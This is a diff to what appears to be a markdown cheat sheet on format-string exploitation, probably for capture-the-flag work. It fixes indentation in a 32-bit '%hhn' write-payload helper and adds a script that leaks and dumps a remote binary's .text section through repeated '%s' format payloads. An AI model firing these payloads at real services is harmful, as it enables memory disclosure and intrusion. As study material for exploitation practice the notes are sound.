@@ -1,4 +1,4 @@
-
+ 
 32bit exploit:
 
 ```
@@ -39,8 +39,36 @@ def fmt_str32(addr, value, offset):
 	written = len(ret)
 	
 	for b in byte:
-	ret += f"%{b[0] - written}c%{offset + b[1]}$hhn".encode()
-	written += b[0] - written
+		ret += f"%{b[0] - written}c%{offset + b[1]}$hhn".encode()
+		written += b[0] - written
 	
 	return ret
+```
+
+## Dump .text section for blind remotes
+```python
+entry = 0x08048000 # .text start address fo 32 bits ELF
+addr = entry
+data = b''
+
+try:
+    while addr < (entry + (4096 * 2)):
+        io = start_skip()
+        if '0a' in hex(addr):
+            addr += 1
+            data += b'\x00'
+        else:
+            io.sendline(f"%0263$s".encode() + b'\x00' + p32(addr))
+            line = io.recvall(0.2)
+            print(line)
+            data += line + b'\x00'
+            addr += len(line) + 1
+        io.close()
+        sleep(0.2)
+except Exception as e:
+    print('[-] Exception: ' + str(e))
+
+with open('dump.bin', 'wb') as f:
+    f.write(data)
+
 ```
